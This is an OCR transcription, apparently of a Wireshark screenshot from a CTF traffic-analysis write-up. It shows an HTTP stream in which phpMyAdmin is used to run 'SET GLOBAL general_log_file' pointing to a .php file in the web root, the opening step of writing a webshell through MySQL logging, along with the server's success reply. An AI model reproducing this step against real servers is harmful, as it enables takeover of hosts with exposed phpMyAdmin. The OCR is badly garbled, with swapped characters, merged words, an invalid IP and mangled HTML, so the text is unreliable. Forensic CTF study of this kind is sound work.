@@ -1,0 +1,38 @@
+# OCR: 4172f380887e9a6fc779a37ed8e319cb.jpg
+# 来源: ./02-WriteUp/2024/2024-精武杯-比武/4172f380887e9a6fc779a37ed8e319cb.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:19
+
+Wireshark追踪HTTP流(tcp.streameq61)·流量分析.pcapng
+POST/phpmyadmin/import.phpHTTP/1.1 Ho5t:192.168.85.256
+User-Agent:Mozilla/5.e(x11;Linuxx8664;rv:6e.e)Gecko/2e1ee1e1Firefox/6e.e Accept:*/*
+Accept-Language:en-us,enjq-e.5 Accept-Encoding:gzip,deflate
+Referer:http://192.168.85.25e/phpmyadmin/server.sql.php?token=0eaa696fe7b68db6be486ob3dea862al
+Content-Type:application/x-ww-form-urlencoded X-Requested-With:XMLHttpRequest
+口
+x
+Content-Length:367
+Cookie:pma_lang-en;pma_mcrypt_iv-QzEy4S7IAAk%3D;pmaUser-1=%2FoA5%2FJwGZeo%3D;pma_navi_width=2ee;phpMyAdmin=tdca7duheqfiqjnubsdqjc9k755nf8sy;pmaPass-1=Lk8rQwafVxwp%2FcD1zSAa
+cQ%3D%3D;wordpress_test_cookie=WP+Cookietcheck Connection:keep-alive
+isjs_confirmed-e&token=00aa696fe7b68db6be486eb3dea862a1&pos-0&goto-server_sql.php&message_to_show-Your+SQL+query+has+been+executed+successfully&prev_sql_query=&sql_query-SET+GL0 BAL+general_log_file%3D'C%3A%5C%5CphpStudy%5C%5CPHPTutoria1%5C%5Cww%5C%5Ce6b8dcf11e2f7adf7ea2999d235bBd84.php&sql_delimiter=%3B&show_query=1&ajax_request=true&_nocache-15604311 80806673851HTTP/1.1200OK
+Date:Thu,13Jun 201913:06:20 GMT
+Server:Apache/2.4.23(win32)OpensSL/1.e.2jmodfcgid/2.3.9 X-Powered-By:PHP/5.6.27
+Expires:Thu,19Nov1981e8:52:eeGMT Cache-Control:no-cache
+Last-Modified:Sat,27Jul2e1322:34:5eGMT
+Keep-Alive:timeout-5,max-10e Connection:Keep-Alive
+Transfer-Encoding:chunked Content-Type:application/json
+("success":true,"message":"<div class-l"success\->Your SQL query hasbeen executed successfully(Query took e.e156 sec)<Vdiv>","sql_query":"<divid-]"result query"align=|"1" >In<divclass=l"success]">YourSQL
+queryhasbeen executedsuccessfully(Query tooke.e156sec)<//divx<codeclass="sqll"><spanclass-l"syntaxl"><spanclass-)"inner.sqll"><ahr
+ef-1".Vurl.php?ur1-http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fset.htm1&amp;token=eeaa696fe7b68db6be486eb3dea862a1l"target=1"mysql_doc\"><spanclass-l"syntax_alphas yntax_alpha_reservediword\">SET<V/span><\/a>
+<spanclass=]"syntax_alphasyntax_alpha_reservediword\">GLOBAL<V/span><span class-\"syntax_alphasyntax_alpha_identifier)">general_lo
+g_file<Vspan><ahref-1-.Vur1.php?ur1=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fcomparison-operators.htm1%23operator_equa1&arp;token=eeaa696fe7b68db6be4860b3dea862 a1l"target-|"mysql_doc/><spanclass=|"syntax_punctl">=<V/span><Va><spanclass=]syntax_quotesyntax_quote_single\">"C:1lllphpStudy\l/PHPTutoriall//lww/llle6b8dcf1ie2f7adf7 ea2999d235b8d84.php'</span></span><Vspan></code><divclas5-l"tools"><formaction=l"sql.php]"method-1"postl">inputtype=1"hidden\"name-1"token\"value=\"eeaa696fe7b68db6be 486eb3doa862ai1"V><inputtype-\"hiddenl"name-|"sql_query/value-|"SETGL0BALgeneral_log_file='C:11l/phpStudyll1/PHPTutoriall11lww/1lle6b8dcf11e2f7adf7ea2999d235b8d84.php'1" V><l/form>[/n<ahref=]server_sql-php?sql_query-SET+GL0BAL+general_1og_file%3D%27C%3A%5C%5CphpStudy%5C%5CPHPTutoria1%5C%5Cwww%5C%5C06b8dcf11e2f7adf7ea2999d235b8d84.php%27&amp;s how_query-1&amp;token=eeaa696fe7b68db6be4860b3dea862a1#querybox1"onclick-l"window.parent.focus_querywindow("SETGL0BALgeneral_log_file=1l'C:1111111/phpStudy/111111/PHPTutorial) N1111//www/1l1111/e6b8dcf11e2f7adf7ea2999d235b8d84.php11");returnfalse;1">Edit</a>n][\n<ahref=1"import.php?sql_query=SET+GL0BAL+general_log_file%3D%27C%3A%5c%5CphpStudy%5C%5CPHPTutoria1%5C%5Cww%5C%5Ce6b8dcf11e2f7adf7ea2999d235b8d84.php%27&amp;show_query=1&amp;show_as_php=1&amp;token=00aa696fe7b68db6b04860b3d0a862a1">CreatePHPCode<V/a>/nJ<V/di v><Vdiv>"
+1喜户端分组，1服务器分组，1tumm(s）
+整个对话（3560bytes）查找：
+Showdataas
+ASCI
+激掉此流
+打印
+男存为…
+返回
+关闭
+流登找下一个N 帮
